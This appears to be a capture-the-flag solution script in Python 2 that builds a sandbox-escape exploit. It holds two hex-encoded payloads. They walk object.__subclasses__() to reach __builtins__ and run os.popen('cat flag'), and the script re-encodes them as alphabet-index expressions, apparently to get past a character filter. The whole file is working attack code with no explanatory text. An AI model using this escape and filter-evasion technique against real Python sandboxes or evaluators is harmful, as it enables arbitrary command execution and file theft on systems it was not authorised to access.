
payload_init_wclass = "77636c617373203d2028292e5f5f636c6173735f5f2e5f5f626173655f5f2e5f5f737562636c61737365735f5f28295b35395d2829"
payload_get_flag = "7072696e742077636c6173732e5f6d6f64756c652e5f5f6275696c74696e735f5f5b275f5f696d706f72745f5f275d28276f7327292e706f70656e282763617420666c616727292e726561642829"

alphabet = "1234567890abcdef"

print "CODE TO INIT WCLASS :"
line_0 = ""
for c in payload_init_wclass:
   line_0 = line_0 + "alphabet["+str(alphabet.index(c))+"]+"
print line_0

print "CODE TO GET THE FLAG :"
line_1 = ""
for c in payload_get_flag:
   line_1 = line_1 + "alphabet["+str(alphabet.index(c))+"]+"
print line_1